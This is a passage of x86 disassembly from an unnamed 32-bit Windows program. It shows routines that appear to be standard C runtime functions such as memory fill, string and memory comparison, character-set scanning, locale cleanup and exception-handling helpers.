  427a83:	mov    edi,esp
  427a85:	mov    DWORD PTR [ebp-0x44],edi
  427a88:	push   esi
  427a89:	push   ebx
  427a8a:	push   edi
  427a8b:	call   0x427d30
  427a90:	add    esp,0xc
  427a93:	jmp    0x427aa5
  427a95:	xor    eax,eax
  427a97:	inc    eax
  427a98:	ret    
  427a99:	mov    esp,DWORD PTR [ebp-0x18]
  427a9c:	call   0x4288c5
  427aa1:	xor    ebx,ebx
  427aa3:	xor    edi,edi
  427aa5:	or     DWORD PTR [ebp-0x4],0xffffffff
  427aa9:	cmp    edi,ebx
  427aab:	jne    0x427ad0
  427aad:	push   DWORD PTR [ebp-0x40]
  427ab0:	call   0x426152
  427ab5:	pop    ecx
  427ab6:	mov    edi,eax
  427ab8:	cmp    edi,ebx
  427aba:	je     0x427aed
  427abc:	push   DWORD PTR [ebp-0x40]
  427abf:	push   ebx
  427ac0:	push   edi
  427ac1:	call   0x427d30
  427ac6:	add    esp,0xc
  427ac9:	mov    DWORD PTR [ebp-0x38],0x1
  427ad0:	push   DWORD PTR [ebp-0x40]
  427ad3:	push   edi
  427ad4:	push   DWORD PTR [ebp+0x14]
  427ad7:	push   DWORD PTR [ebp-0x34]
  427ada:	push   DWORD PTR [ebp+0xc]
  427add:	push   DWORD PTR [ebp+0x8]
  427ae0:	call   DWORD PTR ds:0x429124
  427ae6:	mov    DWORD PTR [ebp-0x40],eax
  427ae9:	cmp    eax,ebx
  427aeb:	jne    0x427af1
  427aed:	xor    esi,esi
  427aef:	jmp    0x427b17
  427af1:	push   DWORD PTR [ebp+0x1c]
  427af4:	push   DWORD PTR [ebp+0x18]
  427af7:	lea    eax,[ebp-0x40]
  427afa:	push   eax
  427afb:	push   edi
  427afc:	push   DWORD PTR [ebp+0x20]
  427aff:	push   DWORD PTR [ebp-0x3c]
  427b02:	call   0x4286f6
  427b07:	add    esp,0x18
  427b0a:	mov    esi,eax
  427b0c:	neg    esi
  427b0e:	sbb    esi,esi
  427b10:	neg    esi
  427b12:	jmp    0x427b17
  427b14:	mov    esi,DWORD PTR [ebp-0x48]
  427b17:	cmp    DWORD PTR [ebp-0x38],ebx
  427b1a:	je     0x427b3f
  427b1c:	push   edi
  427b1d:	call   0x42603a
  427b22:	pop    ecx
  427b23:	jmp    0x427b3f
  427b25:	push   DWORD PTR [ebp+0x1c]
  427b28:	push   DWORD PTR [ebp+0x18]
  427b2b:	push   DWORD PTR [ebp+0x14]
  427b2e:	push   DWORD PTR [ebp+0x10]
  427b31:	push   DWORD PTR [ebp+0xc]
  427b34:	push   DWORD PTR [ebp+0x8]
  427b37:	call   DWORD PTR ds:0x429124
  427b3d:	mov    esi,eax
  427b3f:	cmp    DWORD PTR [ebp-0x34],ebx
  427b42:	je     0x427b4d
  427b44:	push   DWORD PTR [ebp-0x34]
  427b47:	call   0x42603a
  427b4c:	pop    ecx
  427b4d:	mov    eax,esi
  427b4f:	lea    esp,[ebp-0x54]
  427b52:	call   0x42546f
  427b57:	ret    
  427b58:	push   0x1c
  427b5a:	push   0x429ec8
  427b5f:	call   0x425434
  427b64:	xor    esi,esi
  427b66:	cmp    DWORD PTR ds:0x4638c0,esi
  427b6c:	jne    0x427ba3
  427b6e:	lea    eax,[ebp-0x1c]
  427b71:	push   eax
  427b72:	xor    edi,edi
  427b74:	inc    edi
  427b75:	push   edi
  427b76:	push   0x429e9c
  427b7b:	push   edi
  427b7c:	call   DWORD PTR ds:0x429134
  427b82:	test   eax,eax
  427b84:	je     0x427b8e
  427b86:	mov    DWORD PTR ds:0x4638c0,edi
  427b8c:	jmp    0x427ba3
  427b8e:	call   DWORD PTR ds:0x429030
  427b94:	cmp    eax,0x78
  427b97:	jne    0x427ba3
  427b99:	mov    DWORD PTR ds:0x4638c0,0x2
  427ba3:	mov    eax,ds:0x4638c0
  427ba8:	cmp    eax,0x2
  427bab:	je     0x427c9b
  427bb1:	cmp    eax,esi
  427bb3:	je     0x427c9b
  427bb9:	cmp    eax,0x1
  427bbc:	jne    0x427cc1
  427bc2:	mov    DWORD PTR [ebp-0x20],esi
  427bc5:	mov    DWORD PTR [ebp-0x24],esi
  427bc8:	cmp    DWORD PTR [ebp+0x18],esi
  427bcb:	jne    0x427bd5
  427bcd:	mov    eax,ds:0x4638b4
  427bd2:	mov    DWORD PTR [ebp+0x18],eax
  427bd5:	push   esi
  427bd6:	push   esi
  427bd7:	push   DWORD PTR [ebp+0x10]
  427bda:	push   DWORD PTR [ebp+0xc]
  427bdd:	xor    eax,eax
  427bdf:	cmp    DWORD PTR [ebp+0x20],esi
  427be2:	setne  al
  427be5:	lea    eax,[eax*8+0x1]
  427bec:	push   eax
  427bed:	push   DWORD PTR [ebp+0x18]
  427bf0:	call   DWORD PTR ds:0x429128
  427bf6:	mov    edi,eax
  427bf8:	mov    DWORD PTR [ebp-0x28],edi
  427bfb:	test   edi,edi
  427bfd:	je     0x427cc1
  427c03:	and    DWORD PTR [ebp-0x4],0x0
  427c07:	lea    ebx,[edi+edi*1]
  427c0a:	mov    eax,ebx
  427c0c:	add    eax,0x3
  427c0f:	and    eax,0xfffffffc
  427c12:	call   0x425480
  427c17:	mov    DWORD PTR [ebp-0x18],esp
  427c1a:	mov    esi,esp
  427c1c:	mov    DWORD PTR [ebp-0x2c],esi
  427c1f:	push   ebx
  427c20:	push   0x0
  427c22:	push   esi
  427c23:	call   0x427d30
  427c28:	add    esp,0xc
  427c2b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427c2f:	jmp    0x427c46
  427c31:	xor    eax,eax
  427c33:	inc    eax
  427c34:	ret    
  427c35:	mov    esp,DWORD PTR [ebp-0x18]
  427c38:	call   0x4288c5
  427c3d:	xor    esi,esi
  427c3f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427c43:	mov    edi,DWORD PTR [ebp-0x28]
  427c46:	test   esi,esi
  427c48:	jne    0x427c61
  427c4a:	push   edi
  427c4b:	push   0x2
  427c4d:	call   0x426548
  427c52:	pop    ecx
  427c53:	pop    ecx
  427c54:	mov    esi,eax
  427c56:	test   esi,esi
  427c58:	je     0x427cc1
  427c5a:	mov    DWORD PTR [ebp-0x24],0x1
  427c61:	push   edi
  427c62:	push   esi
  427c63:	push   DWORD PTR [ebp+0x10]
  427c66:	push   DWORD PTR [ebp+0xc]
  427c69:	push   0x1
  427c6b:	push   DWORD PTR [ebp+0x18]
  427c6e:	call   DWORD PTR ds:0x429128
  427c74:	test   eax,eax
  427c76:	je     0x427c89
  427c78:	push   DWORD PTR [ebp+0x14]
  427c7b:	push   eax
  427c7c:	push   esi
  427c7d:	push   DWORD PTR [ebp+0x8]
  427c80:	call   DWORD PTR ds:0x429134
  427c86:	mov    DWORD PTR [ebp-0x20],eax
  427c89:	cmp    DWORD PTR [ebp-0x24],0x0
  427c8d:	je     0x427c96
  427c8f:	push   esi
  427c90:	call   0x42603a
  427c95:	pop    ecx
  427c96:	mov    eax,DWORD PTR [ebp-0x20]
  427c99:	jmp    0x427d09
  427c9b:	mov    ebx,DWORD PTR [ebp+0x1c]
  427c9e:	cmp    ebx,esi
  427ca0:	jne    0x427ca8
  427ca2:	mov    ebx,DWORD PTR ds:0x4638a4
  427ca8:	mov    edi,DWORD PTR [ebp+0x18]
  427cab:	test   edi,edi
  427cad:	jne    0x427cb5
  427caf:	mov    edi,DWORD PTR ds:0x4638b4
  427cb5:	push   ebx
  427cb6:	call   0x4286ad
  427cbb:	pop    ecx
  427cbc:	cmp    eax,0xffffffff
  427cbf:	jne    0x427cc5
  427cc1:	xor    eax,eax
  427cc3:	jmp    0x427d09
  427cc5:	cmp    eax,edi
  427cc7:	je     0x427ce7
  427cc9:	push   0x0
  427ccb:	push   0x0
  427ccd:	lea    ecx,[ebp+0x10]
  427cd0:	push   ecx
  427cd1:	push   DWORD PTR [ebp+0xc]
  427cd4:	push   eax
  427cd5:	push   edi
  427cd6:	call   0x4286f6
  427cdb:	add    esp,0x18
  427cde:	mov    esi,eax
  427ce0:	test   esi,esi
  427ce2:	je     0x427cc1
  427ce4:	mov    DWORD PTR [ebp+0xc],esi
  427ce7:	push   DWORD PTR [ebp+0x14]
  427cea:	push   DWORD PTR [ebp+0x10]
  427ced:	push   DWORD PTR [ebp+0xc]
  427cf0:	push   DWORD PTR [ebp+0x8]
  427cf3:	push   ebx
  427cf4:	call   DWORD PTR ds:0x429130
  427cfa:	mov    edi,eax
  427cfc:	test   esi,esi
  427cfe:	je     0x427d07
  427d00:	push   esi
  427d01:	call   0x42603a
  427d06:	pop    ecx
  427d07:	mov    eax,edi
  427d09:	lea    esp,[ebp-0x38]
  427d0c:	call   0x42546f
  427d11:	ret    
  427d12:	mov    eax,ds:0x4638c4
  427d17:	test   eax,eax
  427d19:	je     0x427d2a
  427d1b:	push   DWORD PTR [esp+0x4]
  427d1f:	call   eax
  427d21:	test   eax,eax
  427d23:	pop    ecx
  427d24:	je     0x427d2a
  427d26:	xor    eax,eax
  427d28:	inc    eax
  427d29:	ret    
  427d2a:	xor    eax,eax
  427d2c:	ret    
  427d2d:	int3   
  427d2e:	int3   
  427d2f:	int3   
  427d30:	mov    edx,DWORD PTR [esp+0xc]
  427d34:	mov    ecx,DWORD PTR [esp+0x4]
  427d38:	test   edx,edx
  427d3a:	je     0x427d8b
  427d3c:	xor    eax,eax
  427d3e:	mov    al,BYTE PTR [esp+0x8]
  427d42:	push   edi
  427d43:	mov    edi,ecx
  427d45:	cmp    edx,0x4
  427d48:	jb     0x427d7b
  427d4a:	neg    ecx
  427d4c:	and    ecx,0x3
  427d4f:	je     0x427d5d
  427d51:	sub    edx,ecx
  427d53:	mov    BYTE PTR [edi],al
  427d55:	add    edi,0x1
  427d58:	sub    ecx,0x1
  427d5b:	jne    0x427d53
  427d5d:	mov    ecx,eax
  427d5f:	shl    eax,0x8
  427d62:	add    eax,ecx
  427d64:	mov    ecx,eax
  427d66:	shl    eax,0x10
  427d69:	add    eax,ecx
  427d6b:	mov    ecx,edx
  427d6d:	and    edx,0x3
  427d70:	shr    ecx,0x2
  427d73:	je     0x427d7b
  427d75:	rep stos DWORD PTR es:[edi],eax
  427d77:	test   edx,edx
  427d79:	je     0x427d85
  427d7b:	mov    BYTE PTR [edi],al
  427d7d:	add    edi,0x1
  427d80:	sub    edx,0x1
  427d83:	jne    0x427d7b
  427d85:	mov    eax,DWORD PTR [esp+0x8]
  427d89:	pop    edi
  427d8a:	ret    
  427d8b:	mov    eax,DWORD PTR [esp+0x4]
  427d8f:	ret    
  427d90:	push   esi
  427d91:	mov    esi,DWORD PTR [esp+0x8]
  427d95:	test   esi,esi
  427d97:	je     0x427f1e
  427d9d:	push   DWORD PTR [esi+0x4]
  427da0:	call   0x42603a
  427da5:	push   DWORD PTR [esi+0x8]
  427da8:	call   0x42603a
  427dad:	push   DWORD PTR [esi+0xc]
  427db0:	call   0x42603a
  427db5:	push   DWORD PTR [esi+0x10]
  427db8:	call   0x42603a
  427dbd:	push   DWORD PTR [esi+0x14]
  427dc0:	call   0x42603a
  427dc5:	push   DWORD PTR [esi+0x18]
  427dc8:	call   0x42603a
  427dcd:	push   DWORD PTR [esi]
  427dcf:	call   0x42603a
  427dd4:	push   DWORD PTR [esi+0x20]
  427dd7:	call   0x42603a
  427ddc:	push   DWORD PTR [esi+0x24]
  427ddf:	call   0x42603a
  427de4:	push   DWORD PTR [esi+0x28]
  427de7:	call   0x42603a
  427dec:	push   DWORD PTR [esi+0x2c]
  427def:	call   0x42603a
  427df4:	push   DWORD PTR [esi+0x30]
  427df7:	call   0x42603a
  427dfc:	push   DWORD PTR [esi+0x34]
  427dff:	call   0x42603a
  427e04:	push   DWORD PTR [esi+0x1c]
  427e07:	call   0x42603a
  427e0c:	push   DWORD PTR [esi+0x38]
  427e0f:	call   0x42603a
  427e14:	push   DWORD PTR [esi+0x3c]
  427e17:	call   0x42603a
  427e1c:	add    esp,0x40
  427e1f:	push   DWORD PTR [esi+0x40]
  427e22:	call   0x42603a
  427e27:	push   DWORD PTR [esi+0x44]
  427e2a:	call   0x42603a
  427e2f:	push   DWORD PTR [esi+0x48]
  427e32:	call   0x42603a
  427e37:	push   DWORD PTR [esi+0x4c]
  427e3a:	call   0x42603a
  427e3f:	push   DWORD PTR [esi+0x50]
  427e42:	call   0x42603a
  427e47:	push   DWORD PTR [esi+0x54]
  427e4a:	call   0x42603a
  427e4f:	push   DWORD PTR [esi+0x58]
  427e52:	call   0x42603a
  427e57:	push   DWORD PTR [esi+0x5c]
  427e5a:	call   0x42603a
  427e5f:	push   DWORD PTR [esi+0x60]
  427e62:	call   0x42603a
  427e67:	push   DWORD PTR [esi+0x64]
  427e6a:	call   0x42603a
  427e6f:	push   DWORD PTR [esi+0x68]
  427e72:	call   0x42603a
  427e77:	push   DWORD PTR [esi+0x6c]
  427e7a:	call   0x42603a
  427e7f:	push   DWORD PTR [esi+0x70]
  427e82:	call   0x42603a
  427e87:	push   DWORD PTR [esi+0x74]
  427e8a:	call   0x42603a
  427e8f:	push   DWORD PTR [esi+0x78]
  427e92:	call   0x42603a
  427e97:	push   DWORD PTR [esi+0x7c]
  427e9a:	call   0x42603a
  427e9f:	add    esp,0x40
  427ea2:	push   DWORD PTR [esi+0x80]
  427ea8:	call   0x42603a
  427ead:	push   DWORD PTR [esi+0x84]
  427eb3:	call   0x42603a
  427eb8:	push   DWORD PTR [esi+0x88]
  427ebe:	call   0x42603a
  427ec3:	push   DWORD PTR [esi+0x8c]
  427ec9:	call   0x42603a
  427ece:	push   DWORD PTR [esi+0x90]
  427ed4:	call   0x42603a
  427ed9:	push   DWORD PTR [esi+0x94]
  427edf:	call   0x42603a
  427ee4:	push   DWORD PTR [esi+0x98]
  427eea:	call   0x42603a
  427eef:	push   DWORD PTR [esi+0x9c]
  427ef5:	call   0x42603a
  427efa:	push   DWORD PTR [esi+0xa0]
  427f00:	call   0x42603a
  427f05:	push   DWORD PTR [esi+0xa4]
  427f0b:	call   0x42603a
  427f10:	push   DWORD PTR [esi+0xa8]
  427f16:	call   0x42603a
  427f1b:	add    esp,0x2c
  427f1e:	pop    esi
  427f1f:	ret    
  427f20:	push   esi
  427f21:	mov    esi,DWORD PTR [esp+0x8]
  427f25:	test   esi,esi
  427f27:	je     0x427f7d
  427f29:	mov    eax,DWORD PTR [esi]
  427f2b:	mov    ecx,DWORD PTR ds:0x463434
  427f31:	cmp    eax,DWORD PTR [ecx]
  427f33:	je     0x427f44
  427f35:	cmp    eax,DWORD PTR ds:0x463404
  427f3b:	je     0x427f44
  427f3d:	push   eax
  427f3e:	call   0x42603a
  427f43:	pop    ecx
  427f44:	mov    eax,DWORD PTR [esi+0x4]
  427f47:	mov    ecx,DWORD PTR ds:0x463434
  427f4d:	cmp    eax,DWORD PTR [ecx+0x4]
  427f50:	je     0x427f61
  427f52:	cmp    eax,DWORD PTR ds:0x463408
  427f58:	je     0x427f61
  427f5a:	push   eax
  427f5b:	call   0x42603a
  427f60:	pop    ecx
  427f61:	mov    esi,DWORD PTR [esi+0x8]
  427f64:	mov    eax,ds:0x463434
  427f69:	cmp    esi,DWORD PTR [eax+0x8]
  427f6c:	je     0x427f7d
  427f6e:	cmp    esi,DWORD PTR ds:0x46340c
  427f74:	je     0x427f7d
  427f76:	push   esi
  427f77:	call   0x42603a
  427f7c:	pop    ecx
  427f7d:	pop    esi
  427f7e:	ret    
  427f7f:	push   esi
  427f80:	mov    esi,DWORD PTR [esp+0x8]
  427f84:	test   esi,esi
  427f86:	je     0x428056
  427f8c:	mov    eax,DWORD PTR [esi+0xc]
  427f8f:	mov    ecx,DWORD PTR ds:0x463434
  427f95:	cmp    eax,DWORD PTR [ecx+0xc]
  427f98:	je     0x427fa9
  427f9a:	cmp    eax,DWORD PTR ds:0x463410
  427fa0:	je     0x427fa9
  427fa2:	push   eax
  427fa3:	call   0x42603a
  427fa8:	pop    ecx
  427fa9:	mov    eax,DWORD PTR [esi+0x10]
  427fac:	mov    ecx,DWORD PTR ds:0x463434
  427fb2:	cmp    eax,DWORD PTR [ecx+0x10]
  427fb5:	je     0x427fc6
  427fb7:	cmp    eax,DWORD PTR ds:0x463414
  427fbd:	je     0x427fc6
  427fbf:	push   eax
  427fc0:	call   0x42603a
  427fc5:	pop    ecx
  427fc6:	mov    eax,DWORD PTR [esi+0x14]
  427fc9:	mov    ecx,DWORD PTR ds:0x463434
  427fcf:	cmp    eax,DWORD PTR [ecx+0x14]
  427fd2:	je     0x427fe3
  427fd4:	cmp    eax,DWORD PTR ds:0x463418
  427fda:	je     0x427fe3
  427fdc:	push   eax
  427fdd:	call   0x42603a
  427fe2:	pop    ecx
  427fe3:	mov    eax,DWORD PTR [esi+0x18]
  427fe6:	mov    ecx,DWORD PTR ds:0x463434
  427fec:	cmp    eax,DWORD PTR [ecx+0x18]
  427fef:	je     0x428000
  427ff1:	cmp    eax,DWORD PTR ds:0x46341c
  427ff7:	je     0x428000
  427ff9:	push   eax
  427ffa:	call   0x42603a
  427fff:	pop    ecx
  428000:	mov    eax,DWORD PTR [esi+0x1c]
  428003:	mov    ecx,DWORD PTR ds:0x463434
  428009:	cmp    eax,DWORD PTR [ecx+0x1c]
  42800c:	je     0x42801d
  42800e:	cmp    eax,DWORD PTR ds:0x463420
  428014:	je     0x42801d
  428016:	push   eax
  428017:	call   0x42603a
  42801c:	pop    ecx
  42801d:	mov    eax,DWORD PTR [esi+0x20]
  428020:	mov    ecx,DWORD PTR ds:0x463434
  428026:	cmp    eax,DWORD PTR [ecx+0x20]
  428029:	je     0x42803a
  42802b:	cmp    eax,DWORD PTR ds:0x463424
  428031:	je     0x42803a
  428033:	push   eax
  428034:	call   0x42603a
  428039:	pop    ecx
  42803a:	mov    esi,DWORD PTR [esi+0x24]
  42803d:	mov    eax,ds:0x463434
  428042:	cmp    esi,DWORD PTR [eax+0x24]
  428045:	je     0x428056
  428047:	cmp    esi,DWORD PTR ds:0x463428
  42804d:	je     0x428056
  42804f:	push   esi
  428050:	call   0x42603a
  428055:	pop    ecx
  428056:	pop    esi
  428057:	ret    
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	push   ebp
  428061:	mov    ebp,esp
  428063:	push   esi
  428064:	xor    eax,eax
  428066:	push   eax
  428067:	push   eax
  428068:	push   eax
  428069:	push   eax
  42806a:	push   eax
  42806b:	push   eax
  42806c:	push   eax
  42806d:	push   eax
  42806e:	mov    edx,DWORD PTR [ebp+0xc]
  428071:	lea    ecx,[ecx+0x0]
  428074:	mov    al,BYTE PTR [edx]
  428076:	or     al,al
  428078:	je     0x428083
  42807a:	add    edx,0x1
  42807d:	bts    DWORD PTR [esp],eax
  428081:	jmp    0x428074
  428083:	mov    esi,DWORD PTR [ebp+0x8]
  428086:	or     ecx,0xffffffff
  428089:	lea    ecx,[ecx+0x0]
  42808c:	add    ecx,0x1
  42808f:	mov    al,BYTE PTR [esi]
  428091:	or     al,al
  428093:	je     0x42809e
  428095:	add    esi,0x1
  428098:	bt     DWORD PTR [esp],eax
  42809c:	jae    0x42808c
  42809e:	mov    eax,ecx
  4280a0:	add    esp,0x20
  4280a3:	pop    esi
  4280a4:	leave  
  4280a5:	ret    
  4280a6:	int3   
  4280a7:	int3   
  4280a8:	int3   
  4280a9:	int3   
  4280aa:	int3   
  4280ab:	int3   
  4280ac:	int3   
  4280ad:	int3   
  4280ae:	int3   
  4280af:	int3   
  4280b0:	mov    edx,DWORD PTR [esp+0x4]
  4280b4:	mov    ecx,DWORD PTR [esp+0x8]
  4280b8:	test   edx,0x3
  4280be:	jne    0x4280fc
  4280c0:	mov    eax,DWORD PTR [edx]
  4280c2:	cmp    al,BYTE PTR [ecx]
  4280c4:	jne    0x4280f4
  4280c6:	or     al,al
  4280c8:	je     0x4280f0
  4280ca:	cmp    ah,BYTE PTR [ecx+0x1]
  4280cd:	jne    0x4280f4
  4280cf:	or     ah,ah
  4280d1:	je     0x4280f0
  4280d3:	shr    eax,0x10
  4280d6:	cmp    al,BYTE PTR [ecx+0x2]
  4280d9:	jne    0x4280f4
  4280db:	or     al,al
  4280dd:	je     0x4280f0
  4280df:	cmp    ah,BYTE PTR [ecx+0x3]
  4280e2:	jne    0x4280f4
  4280e4:	add    ecx,0x4
  4280e7:	add    edx,0x4
  4280ea:	or     ah,ah
  4280ec:	jne    0x4280c0
  4280ee:	mov    edi,edi
  4280f0:	xor    eax,eax
  4280f2:	ret    
  4280f3:	nop
  4280f4:	sbb    eax,eax
  4280f6:	shl    eax,1
  4280f8:	add    eax,0x1
  4280fb:	ret    
  4280fc:	test   edx,0x1
  428102:	je     0x42811c
  428104:	mov    al,BYTE PTR [edx]
  428106:	add    edx,0x1
  428109:	cmp    al,BYTE PTR [ecx]
  42810b:	jne    0x4280f4
  42810d:	add    ecx,0x1
  428110:	or     al,al
  428112:	je     0x4280f0
  428114:	test   edx,0x2
  42811a:	je     0x4280c0
  42811c:	mov    ax,WORD PTR [edx]
  42811f:	add    edx,0x2
  428122:	cmp    al,BYTE PTR [ecx]
  428124:	jne    0x4280f4
  428126:	or     al,al
  428128:	je     0x4280f0
  42812a:	cmp    ah,BYTE PTR [ecx+0x1]
  42812d:	jne    0x4280f4
  42812f:	or     ah,ah
  428131:	je     0x4280f0
  428133:	add    ecx,0x2
  428136:	jmp    0x4280c0
  428138:	int3   
  428139:	int3   
  42813a:	int3   
  42813b:	int3   
  42813c:	int3   
  42813d:	int3   
  42813e:	int3   
  42813f:	int3   
  428140:	mov    eax,DWORD PTR [esp+0xc]
  428144:	test   eax,eax
  428146:	je     0x428192
  428148:	mov    edx,DWORD PTR [esp+0x4]
  42814c:	push   esi
  42814d:	push   edi
  42814e:	mov    esi,edx
  428150:	mov    edi,DWORD PTR [esp+0x10]
  428154:	or     edx,edi
  428156:	and    edx,0x3
  428159:	je     0x428193
  42815b:	test   eax,0x1
  428160:	je     0x428173
  428162:	mov    cl,BYTE PTR [esi]
  428164:	cmp    cl,BYTE PTR [edi]
  428166:	jne    0x4281c0
  428168:	add    esi,0x1
  42816b:	add    edi,0x1
  42816e:	sub    eax,0x1
  428171:	je     0x428190
  428173:	mov    cl,BYTE PTR [esi]
  428175:	mov    dl,BYTE PTR [edi]
  428177:	cmp    cl,dl
  428179:	jne    0x4281c0
  42817b:	mov    cl,BYTE PTR [esi+0x1]
  42817e:	mov    dl,BYTE PTR [edi+0x1]
  428181:	cmp    cl,dl
  428183:	jne    0x4281c0
  428185:	add    edi,0x2
  428188:	add    esi,0x2
  42818b:	sub    eax,0x2
  42818e:	jne    0x428173
  428190:	pop    edi
  428191:	pop    esi
  428192:	ret    
  428193:	mov    ecx,eax
  428195:	and    eax,0x3
  428198:	shr    ecx,0x2
  42819b:	je     0x4281c8
  42819d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42819f:	je     0x4281c8
  4281a1:	mov    ecx,DWORD PTR [esi-0x4]
  4281a4:	mov    edx,DWORD PTR [edi-0x4]
  4281a7:	cmp    cl,dl
  4281a9:	jne    0x4281bb
  4281ab:	cmp    ch,dh
  4281ad:	jne    0x4281bb
  4281af:	shr    ecx,0x10
  4281b2:	shr    edx,0x10
  4281b5:	cmp    cl,dl
  4281b7:	jne    0x4281bb
  4281b9:	cmp    ch,dh
  4281bb:	mov    eax,0x0
  4281c0:	sbb    eax,eax
  4281c2:	pop    edi
  4281c3:	sbb    eax,0xffffffff
  4281c6:	pop    esi
  4281c7:	ret    
  4281c8:	test   eax,eax
  4281ca:	je     0x428190
  4281cc:	mov    edx,DWORD PTR [esi]
  4281ce:	mov    ecx,DWORD PTR [edi]
  4281d0:	cmp    dl,cl
  4281d2:	jne    0x4281bb
  4281d4:	sub    eax,0x1
  4281d7:	je     0x4281f5
  4281d9:	cmp    dh,ch
  4281db:	jne    0x4281bb
  4281dd:	sub    eax,0x1
  4281e0:	je     0x4281f5
  4281e2:	and    ecx,0xff0000
  4281e8:	and    edx,0xff0000
  4281ee:	cmp    edx,ecx
  4281f0:	jne    0x4281bb
  4281f2:	sub    eax,0x1
  4281f5:	pop    edi
  4281f6:	pop    esi
  4281f7:	ret    
  4281f8:	int3   
  4281f9:	int3   
  4281fa:	int3   
  4281fb:	int3   
  4281fc:	int3   
  4281fd:	int3   
  4281fe:	int3   
  4281ff:	int3   
  428200:	push   ebp
  428201:	mov    ebp,esp
  428203:	push   edi
  428204:	push   esi
  428205:	push   ebx
  428206:	mov    ecx,DWORD PTR [ebp+0x10]
  428209:	jecxz  0x428232
  42820b:	mov    ebx,ecx
  42820d:	mov    edi,DWORD PTR [ebp+0x8]
  428210:	mov    esi,edi
  428212:	xor    eax,eax
  428214:	repnz scas al,BYTE PTR es:[edi]
  428216:	neg    ecx
  428218:	add    ecx,ebx
  42821a:	mov    edi,esi
  42821c:	mov    esi,DWORD PTR [ebp+0xc]
  42821f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428221:	mov    al,BYTE PTR [esi-0x1]
  428224:	xor    ecx,ecx
  428226:	cmp    al,BYTE PTR [edi-0x1]
  428229:	ja     0x428230
  42822b:	je     0x428232
  42822d:	sub    ecx,0x2
  428230:	not    ecx
  428232:	mov    eax,ecx
  428234:	pop    ebx
  428235:	pop    esi
  428236:	pop    edi
  428237:	leave  
  428238:	ret    
  428239:	int3   
  42823a:	int3   
  42823b:	int3   
  42823c:	int3   
  42823d:	int3   
  42823e:	int3   
  42823f:	int3   
  428240:	push   ebp
  428241:	mov    ebp,esp
  428243:	push   esi
  428244:	xor    eax,eax
  428246:	push   eax
  428247:	push   eax
  428248:	push   eax
  428249:	push   eax
  42824a:	push   eax
  42824b:	push   eax
  42824c:	push   eax
  42824d:	push   eax
  42824e:	mov    edx,DWORD PTR [ebp+0xc]
  428251:	lea    ecx,[ecx+0x0]
  428254:	mov    al,BYTE PTR [edx]
  428256:	or     al,al
  428258:	je     0x428263
  42825a:	add    edx,0x1
  42825d:	bts    DWORD PTR [esp],eax
  428261:	jmp    0x428254
  428263:	mov    esi,DWORD PTR [ebp+0x8]
  428266:	mov    edi,edi
  428268:	mov    al,BYTE PTR [esi]
  42826a:	or     al,al
  42826c:	je     0x42827a
  42826e:	add    esi,0x1
  428271:	bt     DWORD PTR [esp],eax
  428275:	jae    0x428268
  428277:	lea    eax,[esi-0x1]
  42827a:	add    esp,0x20
  42827d:	pop    esi
  42827e:	leave  
  42827f:	ret    
  428280:	push   ebp
  428281:	mov    ebp,esp
  428283:	push   ebx
  428284:	push   esi
  428285:	push   edi
  428286:	push   ebp
  428287:	push   0x0
  428289:	push   0x0
  42828b:	push   0x428298
  428290:	push   DWORD PTR [ebp+0x8]
  428293:	call   0x428d0e
  428298:	pop    ebp
  428299:	pop    edi
  42829a:	pop    esi
  42829b:	pop    ebx
  42829c:	mov    esp,ebp
  42829e:	pop    ebp
  42829f:	ret    
  4282a0:	mov    ecx,DWORD PTR [esp+0x4]
  4282a4:	test   DWORD PTR [ecx+0x4],0x6
  4282ab:	mov    eax,0x1
  4282b0:	je     0x4282c1
  4282b2:	mov    eax,DWORD PTR [esp+0x8]
  4282b6:	mov    edx,DWORD PTR [esp+0x10]
  4282ba:	mov    DWORD PTR [edx],eax
  4282bc:	mov    eax,0x3
  4282c1:	ret    
  4282c2:	push   ebx
  4282c3:	push   esi
  4282c4:	push   edi
  4282c5:	mov    eax,DWORD PTR [esp+0x10]
  4282c9:	push   eax
  4282ca:	push   0xfffffffe
  4282cc:	push   0x4282a0
  4282d1:	push   DWORD PTR fs:0x0
  4282d8:	mov    DWORD PTR fs:0x0,esp
  4282df:	mov    eax,DWORD PTR [esp+0x20]
  4282e3:	mov    ebx,DWORD PTR [eax+0x8]
  4282e6:	mov    esi,DWORD PTR [eax+0xc]
  4282e9:	cmp    esi,0xffffffff
  4282ec:	je     0x42831c
  4282ee:	cmp    esi,DWORD PTR [esp+0x24]
  4282f2:	je     0x42831c
  4282f4:	lea    esi,[esi+esi*2]
  4282f7:	mov    ecx,DWORD PTR [ebx+esi*4]
  4282fa:	mov    DWORD PTR [esp+0x8],ecx
  4282fe:	mov    DWORD PTR [eax+0xc],ecx
  428301:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428306:	jne    0x42831a
  428308:	push   0x101
  42830d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428311:	call   0x428356
  428316:	call   DWORD PTR [ebx+esi*4+0x8]
  42831a:	jmp    0x4282df
  42831c:	pop    DWORD PTR fs:0x0
  428323:	add    esp,0xc
  428326:	pop    edi
  428327:	pop    esi
  428328:	pop    ebx
  428329:	ret    
  42832a:	xor    eax,eax
  42832c:	mov    ecx,DWORD PTR fs:0x0
  428333:	cmp    DWORD PTR [ecx+0x4],0x4282a0
  42833a:	jne    0x42834c
  42833c:	mov    edx,DWORD PTR [ecx+0xc]
  42833f:	mov    edx,DWORD PTR [edx+0xc]
  428342:	cmp    DWORD PTR [ecx+0x8],edx
  428345:	jne    0x42834c
  428347:	mov    eax,0x1
  42834c:	ret    
  42834d:	push   ebx
  42834e:	push   ecx
  42834f:	mov    ebx,0x46344c
  428354:	jmp    0x428360
  428356:	push   ebx
  428357:	push   ecx
  428358:	mov    ebx,0x46344c
  42835d:	mov    ecx,DWORD PTR [ebp+0x8]
  428360:	mov    DWORD PTR [ebx+0x8],ecx
  428363:	mov    DWORD PTR [ebx+0x4],eax
  428366:	mov    DWORD PTR [ebx+0xc],ebp
  428369:	pop    ecx
  42836a:	pop    ebx
  42836b:	ret    0x4
  42836e:	int3   
  42836f:	int3   
  428370:	push   ebp
  428371:	mov    ebp,esp
  428373:	push   edi
  428374:	push   esi
  428375:	mov    esi,DWORD PTR [ebp+0xc]
